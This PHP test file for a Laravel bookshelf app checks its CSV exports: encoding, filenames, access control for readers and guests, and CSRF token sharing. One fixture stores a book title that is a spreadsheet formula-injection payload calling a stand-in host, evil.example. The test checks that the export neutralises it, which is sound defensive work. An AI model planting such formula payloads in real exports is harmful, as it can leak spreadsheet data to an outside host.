<?php

use App\Models\Book;
use App\Models\BookCopy;
use App\Models\Bookshelf;
use App\Models\Membership;
use App\Models\User;
use App\Support\TenantContext;
use Inertia\Testing\AssertableInertia as Assert;

/** Grep first: `grep -rn "^function xphFix" tests/`. */
function xphFix(): array
{
    app(TenantContext::class)->actSystemWide();

    $shelf = Bookshelf::factory()->create(['slug' => 'dong-thap-xph', 'name' => 'Tủ sách Đồng Tháp', 'settings' => []]);
    $manager = User::factory()->create(['full_name' => 'Maria Tải Tệp']);
    Membership::factory()->for($shelf)->create([
        'user_id' => $manager->id, 'role' => 'manager', 'status' => 'active',
    ]);
    $reader = User::factory()->create(['full_name' => 'Anna Không Tải Được']);
    Membership::factory()->for($shelf)->create([
        'user_id' => $reader->id, 'role' => 'reader', 'status' => 'active',
    ]);

    // A book whose title IS a formula, typed by a bored teenager with an
    // account: the end-to-end injection pin.
    $book = Book::query()->create([
        'bookshelf_id' => $shelf->id, 'slug' => 'sach-cong-thuc-xph',
        'title' => '=HYPERLINK("http://evil.example"&A2,"Bấm vào đây")',
    ]);
    BookCopy::query()->create(['bookshelf_id' => $shelf->id, 'book_id' => $book->id, 'code' => 'DT-0001', 'state' => 'available']);

    return compact('shelf', 'manager', 'reader');
}

it('streams a BOM-led UTF-8 CSV to a manager, uncacheable, named twice', function () {
    $f = xphFix();

    $response = $this->actingAs($f['manager'])
        ->post("/shelves/{$f['shelf']->slug}/manage/exports/books");

    $response->assertOk()
        ->assertHeader('Content-Type', 'text/csv; charset=utf-8')
        ->assertHeader('Cache-Control', 'no-store, private');

    $disposition = $response->headers->get('Content-Disposition');
    expect($disposition)->toContain('attachment')
        ->toContain('books-dong-thap-xph-')          // ascii fallback
        ->toContain("filename*=utf-8''");            // RFC 6266, Vietnamese label

    $bytes = $response->streamedContent();
    expect(substr($bytes, 0, 3))->toBe("\xEF\xBB\xBF")          // the BOM, as bytes
        ->and(explode("\r\n", substr($bytes, 3))[0])->toStartWith('Tên sách');
});

it('neutralises a hostile stored title end to end', function () {
    $f = xphFix();

    $bytes = $this->actingAs($f['manager'])
        ->post("/shelves/{$f['shelf']->slug}/manage/exports/books")
        ->streamedContent();

    // The fixture title itself carries a `"`, so Csv::quote() wraps the
    // whole cell in quotes regardless of neutralisation — a raw row can
    // never start with an unquoted "\n=HYPERLINK" either way, which made
    // the line this replaces pass whether or not neutralisation ran (the
    // `'=HYPERLINK` assertion above it is what actually exercises the
    // apostrophe). The real cell-leading question, once a field is
    // quoted, is whether the byte immediately inside the opening quote is
    // the neutralising apostrophe or the raw formula leader.
    expect($bytes)->toContain('\'=HYPERLINK')           // apostrophe-neutralised…
        ->and($bytes)->not->toContain('"=HYPERLINK');   // …never leads inside the quote
});

it('404s a reader', function () {
    $f = xphFix();

    $this->actingAs($f['reader'])
        ->post("/shelves/{$f['shelf']->slug}/manage/exports/books")
        ->assertNotFound();
});

it('redirects a guest', function () {
    // Deviation from the brief's literal test (task-9-brief.md, Step 1):
    // the brief combines this assertion with the reader-404 one above in a
    // single it() block, `actingAs($reader)` FIRST and a bare `$this->
    // post(...)` second. Illuminate\Foundation\Testing\Concerns::actingAs()
    // sets the guard's authenticated user for the REST OF THE TEST METHOD,
    // not just the one call it decorates — Laravel does not log a test out
    // between two HTTP calls in the same it() block. So the brief's second
    // request is not a guest at all; it is still $reader, and the 404 it
    // was asserting to be a redirect passed for the wrong reason (or, as
    // found running this exact test, failed outright: "Expected response
    // status code [...redirect codes] but received 404" — reproduced by
    // running the brief's test verbatim before this split). Proven guest
    // by isolating it in its own it() block, per this brief's own stated
    // house rule elsewhere: "each actor in its own it() block" — the
    // combined block was the one place Task 9's own brief did not follow
    // it.
    $f = xphFix();

    $this->post("/shelves/{$f['shelf']->slug}/manage/exports/books")->assertRedirect();
});

it('404s a reader on readers and loans too — the group gate, not a books-only accident', function () {
    // Task 8's reviewer note this route exists to answer: three ungated
    // readers of a children's table fail open if you miss one. The
    // 'books' case above proves the gate fires for ONE kind; this proves
    // it fires independently for the other two — the gate is the
    // `manage` route group's ['auth', 'role:manager'] middleware
    // (routes/web.php), applied before {kind} is even inspected, so
    // nothing about a specific kind could make one of the three
    // forget to apply it — but "structurally cannot leak" is exactly the
    // kind of claim that must still be measured per kind, not assumed
    // from one green kind.
    $f = xphFix();

    foreach (['readers', 'loans'] as $kind) {
        $this->actingAs($f['reader'])
            ->post("/shelves/{$f['shelf']->slug}/manage/exports/{$kind}")
            ->assertNotFound();
    }
});

it('an unknown kind — constructor included — is a 404, never a 500', function () {
    $f = xphFix();

    foreach (['audit', 'constructor', 'sach', '1'] as $kind) {
        $this->actingAs($f['manager'])
            ->post("/shelves/{$f['shelf']->slug}/manage/exports/{$kind}")
            ->assertNotFound();
    }
});

it('GET is refused — a file of children\'s records is never a link', function () {
    $f = xphFix();

    $this->actingAs($f['manager'])
        ->get("/shelves/{$f['shelf']->slug}/manage/exports/readers")
        ->assertStatus(405);
});

it('readers and loans stream too, each with its own header row', function () {
    // Pinned on the FULL header row, not the first column: books' and
    // loans' first header are both literally 'Tên sách' (lang/vi/
    // exports.php), so a `loans` map entry rewired to run BooksExportQuery
    // would still start with 'Tên sách' and pass a first-column-only
    // check — proven by mutation (see task-9-report.md's fix section):
    // swapping the `loans` table callable for ExportTables::books(...)
    // left the old toStartWith('Tên sách') assertion green. readers'
    // first header ('Tên thánh') is already distinct from both of the
    // other two, checked here too so that is not merely lucky.
    $f = xphFix();

    $expected = [
        'readers' => ['Tên thánh', 'Họ và tên', 'Ngày sinh', 'Tên cha', 'Tên mẹ',
            'Số điện thoại', 'Email', 'Đơn vị', 'Trạng thái', 'Vai trò',
            'Có tài khoản đăng nhập', 'Ngày tham gia'],
        'loans' => ['Tên sách', 'Mã bản sách', 'Người mượn', 'Ngày mượn', 'Hạn trả',
            'Ngày trả', 'Trạng thái', 'Chất lượng khi trả', 'Người cho mượn',
            'Người nhận trả', 'Ghi chú'],
    ];
    // books_headers[0] === loans_headers[0] === 'Tên sách': make that
    // collision explicit rather than trusting the arrays above to differ.
    $booksHeaders = require base_path('lang/vi/exports.php');
    expect($booksHeaders['books_headers'][0])->toBe($expected['loans'][0]);

    foreach ($expected as $kind => $headers) {
        $bytes = $this->actingAs($f['manager'])
            ->post("/shelves/{$f['shelf']->slug}/manage/exports/{$kind}")
            ->streamedContent();
        $headerLine = explode("\r\n", substr($bytes, 3))[0];
        expect($headerLine)->toBe(implode(',', $headers));
    }
});

/** Grep first: `grep -rn "^function xphManagerFor" tests/`. */
function xphManagerFor(string $slug, string $name): array
{
    app(TenantContext::class)->actSystemWide();

    $shelf = Bookshelf::factory()->create(['slug' => $slug, 'name' => $name, 'settings' => []]);
    $manager = User::factory()->create(['full_name' => 'Maria Tên Có Ký Tự Lạ']);
    Membership::factory()->for($shelf)->create([
        'user_id' => $manager->id, 'role' => 'manager', 'status' => 'active',
    ]);

    return compact('shelf', 'manager');
}

it('a shelf name with a slash or a backslash never 500s the export', function () {
    // HeaderUtils::makeDisposition()'s UTF-8 `filename` argument throws
    // InvalidArgumentException on a bare '/' or '\', and nothing at the
    // database level stops a shelf name from carrying either — "Giáo xứ
    // Thánh Tâm / Chi nhánh 2" is an ordinary Vietnamese parish name, not
    // a crafted one.
    foreach (['Tủ sách A/B' => 'slash-name-xph', 'Tu sach A\\B' => 'backslash-name-xph'] as $name => $slug) {
        $f = xphManagerFor($slug, $name);

        $response = $this->actingAs($f['manager'])
            ->post("/shelves/{$f['shelf']->slug}/manage/exports/books");

        $response->assertOk();
        expect($response->headers->get('Content-Disposition'))->not->toBeNull();
    }
});

it('a shelf slug with non-ASCII text or a percent never 500s the export', function () {
    // makeDisposition()'s ASCII `filenameFallback` argument is stricter
    // still: it throws on ANY non-ASCII byte and on a literal '%', on top
    // of the same '/'/'\' ban — a shelf slug is equally unvalidated free
    // text at the database level. rawurlencode() mirrors what a real
    // browser sends for a slug containing either.
    foreach (['probe-đông-xph', 'probe-100%-xph'] as $slug) {
        $f = xphManagerFor($slug, 'Tủ sách Kiểm Tra Ký Tự Lạ');
        $encodedSlug = rawurlencode($f['shelf']->slug);

        $response = $this->actingAs($f['manager'])
            ->post("/shelves/{$encodedSlug}/manage/exports/books");

        $response->assertOk();
        expect($response->headers->get('Content-Disposition'))->not->toBeNull();
    }
});

it('shares a real, non-empty csrfToken prop — the token every audit-page form submits', function () {
    // Deleting HandleInertiaRequests::share()'s 'csrfToken' => ... line
    // leaves the FULL suite green (nothing else reads the prop from the
    // server side), typecheck clean, and the build clean — TypeScript's
    // SharedData.csrfToken: string is a compile-time claim about a
    // runtime payload and cannot see the deletion. The consequence is
    // silent in tests but not in a real browser: the three audit-page
    // forms (resources/js/pages/manage/audit.tsx) submit an empty hidden
    // `_token` field, tokensMatch() fails, and every real export becomes
    // a 419 — with this exact test suite still fully green. Pinned by
    // reading the prop straight off a real Inertia response and checking
    // it is the live session token, not merely present.
    $f = xphFix();

    $response = $this->actingAs($f['manager'])
        ->get("/shelves/{$f['shelf']->slug}/manage/audit");

    $response->assertOk()->assertInertia(fn (Assert $page) => $page
        ->where('csrfToken', session()->token()));

    expect(session()->token())->not->toBeEmpty();
});
